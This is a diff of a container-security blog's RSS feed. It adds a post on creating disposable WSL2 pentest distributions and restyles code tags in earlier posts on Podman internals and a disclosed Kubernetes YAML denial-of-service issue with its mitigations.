@@ -7,6 +7,81 @@
 		<atom:link href="/feed.xml" rel="self" type="application/rss+xml" />
 		
 			<item>
+				<title>Custom Pentest Distributions using WSL2</title>
+				<description>&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;
+
+&lt;p&gt;So with the release of Windows 20.04 over the last week, we’ve finally got the opportunity to use WSL2 without being subscribed to Windows Insider.  After upgrading and getting WSL2 setup, I started thinking about how I could use this as part of my standard pentesting workflow.&lt;/p&gt;
+
+&lt;p&gt;One good practice for pentesting is to create a clean environment for every test you do, to avoid data from one test getting picked up in another and to keep your tooling versions clean. Tools like Ansible are very handy for the packaging piece, I’ve got some playbooks for adding container security tooling to an Ubuntu setup &lt;a href=&quot;https://github.com/raesene/container_sec_workstation&quot;&gt;on GitHub&lt;/a&gt;, but that still leaves the creation of the base install.  Also another challenge can be integrating your pentest environment with your main system.&lt;/p&gt;
+
+&lt;p&gt;With these challenges in mind it seemed like WSL2 could make things easier by providing lightweight virtualized environments with good integration with a Windows host.  What we’ll need however is a way to create “template” WSL2 instances.  By default with WSL and WSL2 you install distributions from the Windows store, but that doesn’t quite fit our use case as what I’m looking to do here is create a new one per test.&lt;/p&gt;
+
+&lt;p&gt;Luckily WSL2 is pretty flexible and we can work round this easily. The steps below are based on the process in &lt;a href=&quot;https://winaero.com/blog/export-import-wsl-linux-distro-windows-10/&quot;&gt;this blog&lt;/a&gt;.  From that we can see that it’s possible to import and export root filesystems to create WSL distributions (kind of the same way you can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--export&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--import&lt;/code&gt; in Docker)&lt;/p&gt;
+
+&lt;h1 id=&quot;creating-a-custom-distribution&quot;&gt;Creating a Custom Distribution&lt;/h1&gt;
+
+&lt;p&gt;The first thing we’ll need is a root filesystem.  Luckily Ubuntu make their WSL root filesystem available for download, which is availble &lt;a href=&quot;https://cloud-images.ubuntu.com/releases/focal/release/ubuntu-20.04-server-cloudimg-amd64-wsl.rootfs.tar.gz&quot;&gt;here&lt;/a&gt;. For this walkthrough I’ve created a directory on my Windows C: drive called “WSL”, we’ll place the rootfs files in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;c:\WSL\wslrootfs&lt;/code&gt; and the distros in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;c:\WSL\wsldistros\&lt;/code&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Download the file above to the wslrootfs directory.&lt;/li&gt;
+  &lt;li&gt;Run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wsl.exe --import baseubu C:\wsl\wsldistros\baseubu\ C:\wsl\wslrootfs\ubuntu-20.04-server-cloudimg-amd64-wsl.rootfs.tar.gz&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;In this command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;baseubu&lt;/code&gt; Is just a name you want to assign so for example a specific project. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;c:\wsl\wsldistros\baseubu\&lt;/code&gt; is the directory on your machine you want to place the virtual disk file for the distribution and then we have the distro file we downloaded&lt;/p&gt;
+
+&lt;p&gt;At this point you have a clean install of ubuntu 20.04 to use. You can then easily access each distribution you have available with Windows Terminal which places them all on a tab drop-down for easy access.&lt;/p&gt;
+
+&lt;h1 id=&quot;adding-docker-into-our-distribution&quot;&gt;Adding Docker into our distribution&lt;/h1&gt;
+
+&lt;p&gt;If you’ve got &lt;a href=&quot;https://docs.docker.com/docker-for-windows/&quot;&gt;Docker for Windows&lt;/a&gt; installed, you can also easily integrate it into this environment, so you can get all your favourite container based goodies working.  To do this, go into Docker’s settings, go to Resources–&amp;gt; WSL Integration.  You’ll see a list of your distributions, including the one you’ve just imported.  Flick the slider next to it to “on” , then click “apply and restart” and all your docker commands should work just fine then next time you start a session with that distro.&lt;/p&gt;
+
+&lt;h1 id=&quot;visual-studio-code-integration&quot;&gt;Visual Studio Code Integration&lt;/h1&gt;
+
+&lt;p&gt;Another nice Add-On that WSL2 brings is integration with &lt;a href=&quot;https://code.visualstudio.com/&quot;&gt;Visual Studio Code&lt;/a&gt;.  This means that the filesystem that VS Code sees is your WSL2 distro and you can open a terminal inside VS Code that works inside the distro too. For this just install the “Remote - WSL” plugin, then you can use the “Remote Explorer” button on the left hand side of the VS Code Window, to open a directory inside WSL.&lt;/p&gt;
+
+&lt;p&gt;You can also get other VS Code plugins working inside the WSL environment, so things like the Docker and Kubernetes plugins can be installed and will work from that perspective too.&lt;/p&gt;
+
+&lt;h1 id=&quot;host-filesystem-integration&quot;&gt;Host Filesystem Integration&lt;/h1&gt;
+
+&lt;p&gt;In common with WSL1 the host’s filesystem is visible inside the distro. It’ll be mounted at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/mnt/c/&lt;/code&gt; so you can easily copy files into and out of the environment.&lt;/p&gt;
+
+&lt;h1 id=&quot;customizing-our-distribution-for-container-work&quot;&gt;Customizing our Distribution for Container Work&lt;/h1&gt;
+
+&lt;p&gt;Once we’re up and running we can customize our environment for the test type we’re using.  I’m using some ansible playbooks for this from &lt;a href=&quot;https://github.com/raesene/container_sec_workstation&quot;&gt;this repo&lt;/a&gt;.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Install ansible first.  If you’re using Ubuntu 20.04 you can just &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apt update &amp;amp;&amp;amp; apt install -y ansible&lt;/code&gt; to get that working&lt;/li&gt;
+  &lt;li&gt;Then run the playbook &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ansible-playbook wsl_container_workstation.yml&lt;/code&gt; and it sets up the necessary tooling&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;using-our-wsl-distro-as-a-template&quot;&gt;Using our WSL distro as a template&lt;/h1&gt;
+
+&lt;p&gt;Now that we’ve got the tooling we want installed, if we don’t want to re-run the ansible playbook for every test, we can export the rootfs for later use.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wsl --export baseubu c:\wsl\wslrootfs\containersec
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Then we can create new instances based off this by importing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;containersec&lt;/code&gt; file we just created&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wsl --import test1 c:\wsl\wsldistros\test1\ c:\wsl\wslrootfs\containersec
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;and when we start it up, all our tools are in place :)&lt;/p&gt;
+
+&lt;h1 id=&quot;cleaning-up&quot;&gt;Cleaning up&lt;/h1&gt;
+
+&lt;p&gt;Once you’re finished with it, it can just be removed with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wsl.exe --unregister &amp;lt;Name&amp;gt;&lt;/code&gt;. This will delete the virtual disk file and leave everything nice and clean.&lt;/p&gt;
+
+&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;
+
+&lt;p&gt;Overall I think that WSL2 along with Windows Terminal, Visual Studio Code, and Docker for Windows, can provide a very nice Linux based environment inside a host Windows OS. So for environments where you can’t, or don’t want to, run Linux as your base OS, it becomes fairly easy to set-up your tooling the way you want it to work.&lt;/p&gt;
+</description>
+				<pubDate>Sun, 31 May 2020 11:10:39 +0100</pubDate>
+				<link>/blog/2020/05/31/Custom_Pentest_Distributions_With_WSL2/</link>
+				<guid isPermaLink="true">/blog/2020/05/31/Custom_Pentest_Distributions_With_WSL2/</guid>
+			</item>
+		
+			<item>
 				<title>More Podman - Rootfull containers, Networking and processes</title>
 				<description>&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;
 
@@ -16,7 +91,7 @@
 
 &lt;h2 id=&quot;running-podman-as-root&quot;&gt;Running podman as root&lt;/h2&gt;
 
-&lt;p&gt;So we can use &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo&lt;/code&gt; on an ubuntu host to run podman containers as the root user. There’s a couple of reasons you might want to do this.  First up would be that you need access to functions that are not available to your standard user (for example binding ports &amp;lt; 1024), another could be down to the differences in network behaviour between rootless and rootfull containers.&lt;/p&gt;
+&lt;p&gt;So we can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo&lt;/code&gt; on an ubuntu host to run podman containers as the root user. There’s a couple of reasons you might want to do this.  First up would be that you need access to functions that are not available to your standard user (for example binding ports &amp;lt; 1024), another could be down to the differences in network behaviour between rootless and rootfull containers.&lt;/p&gt;
 
 &lt;p&gt;One thing you’ll notice immediately when using sudo to run podman containers is that, you’re not sharing any container images with your ordinary user, so it’ll pull down images that aren’t present for the root user.&lt;/p&gt;
 
@@ -24,11 +99,11 @@
 
 &lt;h2 id=&quot;difference-in-networking---rootless-vs-rootfull&quot;&gt;Difference in networking - rootless v.s. rootfull&lt;/h2&gt;
 
-&lt;p&gt;Another area where there are some notable differences between rootless and rootfull containers under podman is in networking.  As mentioned last time rootless containers use &lt;code class=&quot;highlighter-rouge&quot;&gt;slirp4netns&lt;/code&gt; to provide containers an IP address.  This is quite a different model to the Docker bridge, with a couple of practical effects.&lt;/p&gt;
+&lt;p&gt;Another area where there are some notable differences between rootless and rootfull containers under podman is in networking.  As mentioned last time rootless containers use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;slirp4netns&lt;/code&gt; to provide containers an IP address.  This is quite a different model to the Docker bridge, with a couple of practical effects.&lt;/p&gt;
 
 &lt;ul&gt;
-  &lt;li&gt;There’s no shared network for rootless containers.  Each one is plumbed into a &lt;code class=&quot;highlighter-rouge&quot;&gt;tap&lt;/code&gt; interface which is then networked out to the host by slirp4netns.  So if you start two containers in rootless mode, by default, they can’t talk directly to each other without exposing ports on the host.&lt;/li&gt;
-  &lt;li&gt;All your containers get the same IP address.  On the installation I’m using they all get &lt;code class=&quot;highlighter-rouge&quot;&gt;10.0.2.100&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;There’s no shared network for rootless containers.  Each one is plumbed into a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tap&lt;/code&gt; interface which is then networked out to the host by slirp4netns.  So if you start two containers in rootless mode, by default, they can’t talk directly to each other without exposing ports on the host.&lt;/li&gt;
+  &lt;li&gt;All your containers get the same IP address.  On the installation I’m using they all get &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.0.2.100&lt;/code&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;p&gt;By comparison, if you run containers rootfully, the networking looks much more similar to the default Docker configuration. Containers will get an individual IP address, and will be able to communicate with other containers on the bridge network that they’ve been connected to.&lt;/p&gt;
@@ -41,7 +116,7 @@
 
 &lt;p&gt;When I was looking round Podman’s networking options, I noticed that there’s a plug-in that can allow Rootfull podman containers to do something similar, but with DHCP support.  This basically follows &lt;a href=&quot;https://www.redhat.com/sysadmin/leasing-ips-podman&quot;&gt;this post&lt;/a&gt; on the Redhat blog, but there’s a couple of details that worked differently on the system I was running on.&lt;/p&gt;
 
-&lt;p&gt;After creating a network config, as mentioned in the post you start the DHCP plug-in.  On ubuntu this is in &lt;code class=&quot;highlighter-rouge&quot;&gt;/opt/cni/bin&lt;/code&gt; instead of &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/libexec/cni&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;After creating a network config, as mentioned in the post you start the DHCP plug-in.  On ubuntu this is in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/opt/cni/bin&lt;/code&gt; instead of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/libexec/cni&lt;/code&gt;&lt;/p&gt;
 
 &lt;p&gt;You can then run a container attached to that network and it’ll get an IP address on the same LAN as your host.  In my set-up this took a couple of seconds to do and you get some “network is down” messages as it’s starting, which can be a bit disconcerting, but it does work!&lt;/p&gt;
 
@@ -71,15 +146,15 @@
 
 &lt;h2 id=&quot;initial-post-installation&quot;&gt;Initial Post Installation&lt;/h2&gt;
 
-&lt;p&gt;After installation, with Docker there are two daemon processes running, containerd and dockerd.  With podman, as expected, there are no long running processes initially.  One thing I did notice, which was unexpected was that after running the &lt;code class=&quot;highlighter-rouge&quot;&gt;podman info&lt;/code&gt; command, a podman process was left running on the host.&lt;/p&gt;
+&lt;p&gt;After installation, with Docker there are two daemon processes running, containerd and dockerd.  With podman, as expected, there are no long running processes initially.  One thing I did notice, which was unexpected was that after running the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;podman info&lt;/code&gt; command, a podman process was left running on the host.&lt;/p&gt;
 
 &lt;h2 id=&quot;image-storage&quot;&gt;Image storage&lt;/h2&gt;
 
-&lt;p&gt;The Docker daemon stores all the files related to it in &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/lib/docker&lt;/code&gt; which obviously won’t make sense for a container tool that’s running for the individual user.  Podman stores its files at &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/$USER/.local/share/containers/storage&lt;/code&gt; .  One point that could be relevant here for some use cases is that this will mean that if you have multiple users on a host running containers, each user will pull and store their own copy of all images, which would take some additional storage&lt;/p&gt;
+&lt;p&gt;The Docker daemon stores all the files related to it in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/lib/docker&lt;/code&gt; which obviously won’t make sense for a container tool that’s running for the individual user.  Podman stores its files at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/$USER/.local/share/containers/storage&lt;/code&gt; .  One point that could be relevant here for some use cases is that this will mean that if you have multiple users on a host running containers, each user will pull and store their own copy of all images, which would take some additional storage&lt;/p&gt;
 
 &lt;h2 id=&quot;basic-commands&quot;&gt;Basic commands&lt;/h2&gt;
 
-&lt;p&gt;Running a basic interactive container with &lt;code class=&quot;highlighter-rouge&quot;&gt;podman run -it ubuntu:18.04 /bin/bash&lt;/code&gt; works as expected and lands you in a “root” shell inside the container.  One interesting point is that, on Ubuntu, podman defaults to requesting images from Docker Hub first, although it does support a registry search order.  This is an important point for security as having a different search order for container images could result in unexpected behaviour (more details on this &lt;a href=&quot;https://raesene.github.io/blog/2019/09/25/typosquatting-in-a-multi-registry-world/&quot;&gt;here&lt;/a&gt; and &lt;a href=&quot;https://github.com/containers/libpod/issues/4549&quot;&gt;here&lt;/a&gt;)&lt;/p&gt;
+&lt;p&gt;Running a basic interactive container with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;podman run -it ubuntu:18.04 /bin/bash&lt;/code&gt; works as expected and lands you in a “root” shell inside the container.  One interesting point is that, on Ubuntu, podman defaults to requesting images from Docker Hub first, although it does support a registry search order.  This is an important point for security as having a different search order for container images could result in unexpected behaviour (more details on this &lt;a href=&quot;https://raesene.github.io/blog/2019/09/25/typosquatting-in-a-multi-registry-world/&quot;&gt;here&lt;/a&gt; and &lt;a href=&quot;https://github.com/containers/libpod/issues/4549&quot;&gt;here&lt;/a&gt;)&lt;/p&gt;
 
 &lt;h2 id=&quot;processes-behind-the-scenes&quot;&gt;Processes behind the scenes&lt;/h2&gt;
 
@@ -89,13 +164,13 @@
 
 &lt;p&gt;These two processes are used for every container, so if you run 10 containers, you’ll get 20 supporting processes.&lt;/p&gt;
 
-&lt;p&gt;Comparing this to Docker, conmon seems to be the equivalent of the &lt;code class=&quot;highlighter-rouge&quot;&gt;containerd-shim&lt;/code&gt; process that runs with every container and there’s no &lt;code class=&quot;highlighter-rouge&quot;&gt;slirp4netns&lt;/code&gt; equivalent needed as Docker is running with &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; privileges.&lt;/p&gt;
+&lt;p&gt;Comparing this to Docker, conmon seems to be the equivalent of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;containerd-shim&lt;/code&gt; process that runs with every container and there’s no &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;slirp4netns&lt;/code&gt; equivalent needed as Docker is running with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; privileges.&lt;/p&gt;
 
 &lt;h2 id=&quot;namespaces&quot;&gt;Namespaces&lt;/h2&gt;
 
-&lt;p&gt;Docker uses Linux namespaces to provide an isolated environment for contained processes, and as they both use &lt;code class=&quot;highlighter-rouge&quot;&gt;runc&lt;/code&gt; under the covers, it’s not too surprising to see that &lt;code class=&quot;highlighter-rouge&quot;&gt;podman&lt;/code&gt; is similar. There are some differences though that are worth noting.  Running &lt;code class=&quot;highlighter-rouge&quot;&gt;lsns&lt;/code&gt; on a host running an ubuntu container via podman we can see the following&lt;/p&gt;
+&lt;p&gt;Docker uses Linux namespaces to provide an isolated environment for contained processes, and as they both use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;runc&lt;/code&gt; under the covers, it’s not too surprising to see that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;podman&lt;/code&gt; is similar. There are some differences though that are worth noting.  Running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lsns&lt;/code&gt; on a host running an ubuntu container via podman we can see the following&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;4026532621 user        4  1352 rorym            podman
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;4026532621 user        4  1352 rorym            podman
 4026532622 mnt         2  1352 rorym            podman
 4026532624 net         1  1479 rorym            /bin/bash
 4026532679 mnt         1  1479 rorym            /bin/bash
@@ -105,24 +180,24 @@
 4026532683 pid         1  1479 rorym            /bin/bash
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Running &lt;code class=&quot;highlighter-rouge&quot;&gt;lsns&lt;/code&gt; on a Docker container doing using the same image and command we get&lt;/p&gt;
+&lt;p&gt;Running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lsns&lt;/code&gt; on a Docker container doing using the same image and command we get&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;4026532626 mnt         1  1932 root             /bin/bash
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;4026532626 mnt         1  1932 root             /bin/bash
 4026532627 uts         1  1932 root             /bin/bash
 4026532628 ipc         1  1932 root             /bin/bash
 4026532629 pid         1  1932 root             /bin/bash
 4026532631 net         1  1932 root             /bin/bash
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;The podman list includes a user namespace which isn’t too surprising as we’re running as an ordinary user, but appear to be the &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; user inside the container.  What is interesting is that there’s a single user namespace which is attached to the podman process, rather than it being directly attached to the container.  Also we can see that there’s a mnt namespace for slirp4netns.&lt;/p&gt;
+&lt;p&gt;The podman list includes a user namespace which isn’t too surprising as we’re running as an ordinary user, but appear to be the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; user inside the container.  What is interesting is that there’s a single user namespace which is attached to the podman process, rather than it being directly attached to the container.  Also we can see that there’s a mnt namespace for slirp4netns.&lt;/p&gt;
 
 &lt;h2 id=&quot;capabilities&quot;&gt;Capabilities&lt;/h2&gt;
 
 &lt;p&gt;By default, Docker containers get a set of capabilities, which can allow them to execute operations which require root privileges.  While podman is running as an ordinary user and making use of user namespaces, it does still use capabilities, but unlike Docker they only allow privileges within the user namespace and not over the entire host.&lt;/p&gt;
 
-&lt;p&gt;Running &lt;code class=&quot;highlighter-rouge&quot;&gt;pscap&lt;/code&gt; under podman shows the following lines relevant to podman&lt;/p&gt;
+&lt;p&gt;Running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pscap&lt;/code&gt; under podman shows the following lines relevant to podman&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1     1352  rorym       podman pause      full
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1     1352  rorym       podman pause      full
 1     1465  rorym       slirp4netns       net_bind_service
 1     1468  rorym       conmon            full
 1468  1479  rorym       bash              chown, dac_override, fowner, fsetid, kill, setgid, setuid, setpcap, net_bind_service, net_raw, sys_chroot, mknod, audit_write, setfcap
@@ -130,7 +205,7 @@
 
 &lt;p&gt;For Docker we get :-&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;978   1913  root        containerd-shim   full
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;978   1913  root        containerd-shim   full
 1913  1932  root        bash              chown, dac_override, fowner, fsetid, kill, setgid, setuid, setpcap, net_bind_service, net_raw, sys_chroot, mknod, audit_write, setfcap
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
@@ -138,13 +213,13 @@
 
 &lt;h2 id=&quot;apparmor&quot;&gt;AppArmor&lt;/h2&gt;
 
-&lt;p&gt;Docker provides a default AppArmor policy which restricts the contained process.  Looking at the podman setup, there doesn’t appear to be an apparmor policy getting enabled by default.  Running &lt;code class=&quot;highlighter-rouge&quot;&gt;aa-status&lt;/code&gt; shows 0 processes in enforce mode.&lt;/p&gt;
+&lt;p&gt;Docker provides a default AppArmor policy which restricts the contained process.  Looking at the podman setup, there doesn’t appear to be an apparmor policy getting enabled by default.  Running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aa-status&lt;/code&gt; shows 0 processes in enforce mode.&lt;/p&gt;
 
 &lt;h2 id=&quot;seccomp&quot;&gt;Seccomp&lt;/h2&gt;
 
-&lt;p&gt;Docker also uses a &lt;a href=&quot;https://www.kernel.org/doc/html/v4.16/userspace-api/seccomp_filter.html&quot;&gt;seccomp-bpf&lt;/a&gt; filter to restrict calls to specific syscalls.  Looking at the &lt;code class=&quot;highlighter-rouge&quot;&gt;bash&lt;/code&gt; process running under Podman, we can see that there is also a Seccomp profile attached there&lt;/p&gt;
+&lt;p&gt;Docker also uses a &lt;a href=&quot;https://www.kernel.org/doc/html/v4.16/userspace-api/seccomp_filter.html&quot;&gt;seccomp-bpf&lt;/a&gt; filter to restrict calls to specific syscalls.  Looking at the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bash&lt;/code&gt; process running under Podman, we can see that there is also a Seccomp profile attached there&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cat /proc/1479/status | grep Seccomp
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cat /proc/1479/status | grep Seccomp
 Seccomp:	2
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
@@ -171,11 +246,11 @@ Seccomp:	2
 
 &lt;p&gt;The YAML posted was a lightly modified version of the YAML bomb example on this &lt;a href=&quot;https://en.wikipedia.org/wiki/Billion_laughs_attack&quot;&gt;Wikipedia page&lt;/a&gt; about the “Billion Laughs Attack”.  This is an issue mainly associated with XML parsing where recursive entities can be defined in a document and, when expanding them, the process parsing the document consumes large amounts of CPU and memory.&lt;/p&gt;
 
-&lt;p&gt;A bit of checking seemed to show that this indeed was a valid issue but that the resource utilization was on the client-side in &lt;code class=&quot;highlighter-rouge&quot;&gt;kubectl&lt;/code&gt; and not server-side, so it wouldn’t seem like a major issue.&lt;/p&gt;
+&lt;p&gt;A bit of checking seemed to show that this indeed was a valid issue but that the resource utilization was on the client-side in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kubectl&lt;/code&gt; and not server-side, so it wouldn’t seem like a major issue.&lt;/p&gt;
 
-&lt;p&gt;That changed after conferring with Brad Geesaman and Jordan Liggitt on the Kubernetes slack as it became obvious that the Denial of Service could occur on either the client or server, depending on how the document was passed to the server. When &lt;code class=&quot;highlighter-rouge&quot;&gt;kubectl&lt;/code&gt; was used the YAML was parsed locally before being passed to the Kubernetes API server, however by using &lt;code class=&quot;highlighter-rouge&quot;&gt;curl&lt;/code&gt; the YAML could be passed directly to the API server causing the YAML to be parsed server-side.&lt;/p&gt;
+&lt;p&gt;That changed after conferring with Brad Geesaman and Jordan Liggitt on the Kubernetes slack as it became obvious that the Denial of Service could occur on either the client or server, depending on how the document was passed to the server. When &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kubectl&lt;/code&gt; was used the YAML was parsed locally before being passed to the Kubernetes API server, however by using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt; the YAML could be passed directly to the API server causing the YAML to be parsed server-side.&lt;/p&gt;
 
-&lt;p&gt;Doing some initial testing on a local VM it was obvious that the server could be DoS’d with a relatively small number of requests and Brad checked that this could also impact cloud hosted versions. The example given did require the attacker to be able to create &lt;code class=&quot;highlighter-rouge&quot;&gt;configMap&lt;/code&gt; objects on the server, which reduced the number of potential attackers considerably, so this would be an moderately serious issue but not too bad, as it required an authenticated user.&lt;/p&gt;
+&lt;p&gt;Doing some initial testing on a local VM it was obvious that the server could be DoS’d with a relatively small number of requests and Brad checked that this could also impact cloud hosted versions. The example given did require the attacker to be able to create &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;configMap&lt;/code&gt; objects on the server, which reduced the number of potential attackers considerably, so this would be an moderately serious issue but not too bad, as it required an authenticated user.&lt;/p&gt;
 
 &lt;p&gt;After that though, some more investigation did show that, under some circumstances, it was possible to pass YAML to the server as an unauthenticated user, which makes the issue more serious, especially if your Kubernetes cluster is exposed to the Internet.  This is a (somewhat surprisingly) common configuration, with over 200,000 Kubernetes servers being internet facing (based on statistics from &lt;a href=&quot;https://www.binaryedge.io/&quot;&gt;Binary Edge&lt;/a&gt;).  It won’t always be the case that older clusters are vulnerable (as it depends on the exact configuration) but it’s more likely.&lt;/p&gt;
 
@@ -187,7 +262,7 @@ Seccomp:	2
 
 &lt;p&gt;Secondly, consider whether your Kubernetes server needs to be directly exposed to the Internet, or whether access to it can be restricted using firewalling or placing it behind a bastion host or VPN.&lt;/p&gt;
 
-&lt;p&gt;Another good mitigation is to minimize or remove anonymous access from the Kubernetes API server, although care is needed here as some monitoring tools require unauthenticated access to some endpoints.  Some older versions of Kubernetes allowed quite a few unauthenticated requests, including some which can trigger this issue.  Removing access from the &lt;code class=&quot;highlighter-rouge&quot;&gt;system:unauthenticated&lt;/code&gt; user or setting &lt;code class=&quot;highlighter-rouge&quot;&gt;--anonymous-auth=false&lt;/code&gt; on the API server can reduce the risk of this issue being triggered on a cluster.  Again, if you’re using a managed Kubernetes distribution, you’ll need to speak to your vendor about enabling those flags.&lt;/p&gt;
+&lt;p&gt;Another good mitigation is to minimize or remove anonymous access from the Kubernetes API server, although care is needed here as some monitoring tools require unauthenticated access to some endpoints.  Some older versions of Kubernetes allowed quite a few unauthenticated requests, including some which can trigger this issue.  Removing access from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system:unauthenticated&lt;/code&gt; user or setting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--anonymous-auth=false&lt;/code&gt; on the API server can reduce the risk of this issue being triggered on a cluster.  Again, if you’re using a managed Kubernetes distribution, you’ll need to speak to your vendor about enabling those flags.&lt;/p&gt;
 
 &lt;h2 id=&quot;underlying-library---a-tale-of-differing-perspectives&quot;&gt;Underlying library - A tale of differing perspectives&lt;/h2&gt;
 
@@ -220,13 +295,13 @@ Seccomp:	2
 
 &lt;p&gt;However, given the way Kubernetes works, it’s possible to access these service IP addresses by the simple expedient of …. Adding a route to them :)  Essentially Kubernetes nodes are Linux routers and kube-proxy will direct traffic for us and doesn’t generally care what generated that traffic.&lt;/p&gt;
 
-&lt;p&gt;Let’s provide a concrete example.  I’ve got a single node Kubeadm cluster with a single Ethernet interface &lt;code class=&quot;highlighter-rouge&quot;&gt;ens33&lt;/code&gt; with an IP address of &lt;code class=&quot;highlighter-rouge&quot;&gt;172.16.198.131&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Let’s provide a concrete example.  I’ve got a single node Kubeadm cluster with a single Ethernet interface &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ens33&lt;/code&gt; with an IP address of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;172.16.198.131&lt;/code&gt;.&lt;/p&gt;
 
